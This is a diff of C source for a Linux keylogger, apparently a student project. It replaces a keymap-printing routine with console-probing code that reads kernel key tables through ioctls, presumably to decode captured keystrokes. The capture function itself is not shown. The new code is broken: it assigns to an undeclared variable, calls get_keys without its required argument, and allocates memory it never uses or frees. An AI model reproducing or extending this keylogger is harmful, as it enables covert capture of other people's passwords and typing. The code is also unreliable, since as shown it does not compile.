@@ -6,7 +6,7 @@
 /*   By: root </var/mail/root>                      +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2018/09/28 05:57:11 by root              #+#    #+#             */
-/*   Updated: 2018/10/03 19:22:23 by root             ###   ########.fr       */
+/*   Updated: 2018/10/04 23:10:51 by root             ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -22,9 +22,6 @@
 #include <linux/input.h>
 #include <signal.h>
 #include <linux/keyboard.h>
-
-extern unsigned short *key_maps[MAX_NR_KEYMAPS];
-extern unsigned short plain_map[NR_KEYS];
 
 static int			filter(const struct dirent *file)
 {
@@ -328,18 +325,79 @@ static void	keylogger(int keybd)
 	}
 }
 
-static void print_hdr()
+typedef struct	s_keys
 {
-	size_t	size = sizeof(key_maps) / sizeof(*key_maps);
+	char	*name;
+	size_t	value;
+}				t_keys;
 
-	printf("NB    | Content\n");
-	for (size_t i = 0 ; key_maps[i] ; i++) {
-		printf("%ld  |", i);
-		for (size_t j = 0 ; key_maps[i][j]; j++) {
-			printf(" %lx", key_maps[i][j]);
-		}
-		printf("\n");
+static int	is_a_console(int fd)
+{
+	char	arg;
+
+	arg = 0;
+	return (ioctl(fd, KDGKBTYPE, &arg) == 0 && ((arg == KB_101) || (arg == KB_84)));
+}
+
+static int			has_keys(int fd, int n)
+{
+	struct kbentry	ke;
+
+	ke.kb_table = 0;
+	ke.kb_index = n;
+	return !ioctl(fd, KDGKBENT, (unsigned long)&ke);
+}
+
+static void			get_keys(int fd)
+{
+	int				nb_keys;
+	char			**keys;
+
+	nb_keys = (has_keys(fd, 255) ? 256 : has_keys(fd, 127) ? 128 : 112);
+	keys = malloc(sizeof(*keys) * nb_keys);
+	if (keys == NULL) {
+		fprintf(stderr, "Can't allocate %do for keys\n", nb_keys);
+		return;
 	}
+	for (int i = 0; i < nb_keys; i++)
+	{
+		keys[i] = malloc(sizeof(**keys) * MAX_NR_KEYMAPS);
+		if (keys[i] == NULL) {
+			fprintf(stderr, "Can't allocate %do for %dth key\n", MAX_NR_KEYMAPS, i);
+			return;
+		}
+	}
+}
+
+static void dumpkeys()
+{
+	char	*console[] = { "/dev/tty", "/dev/tty0", "/dev/vc/0", "/dev/console" };
+	int		fd;
+
+	fd = -1;
+	for (size_t i = 0; i < sizeof(console) / sizeof(*console); i++)
+	{
+		fd = open(console[i], O_RDWR);
+		if (fd < 0 && errno == EACCES)
+			fd = open(console[i], O_WRONLY);
+		if (fd < 0 && errno == EACCES)
+			fd = open(console[i], O_RDONLY);
+		if (fd < 0)
+			continue ;
+		arg = 0;
+		if (is_a_console(fd))
+			break ;
+		close(fd);
+		fd = -1;
+	}
+	if (fd < 0)
+		for (fd = 0; fd < 3; fd++)
+			if (is_a_console(fd))
+				break ;
+	if (fd < 0)
+		fprintf(stderr, "Can't get a file descriptor refering to a terminal\n");
+	else
+		get_keys();
 }
 
 int			main(void)
@@ -347,7 +405,7 @@ int			main(void)
 	char	*keyboard;
 	int		fd;
 
-	print_hdr();
+	dumpkeys();
 	if ((keyboard = get_keyboard()) == NULL)
 		return 1;
 	printf("keyboard: %s\n", keyboard);
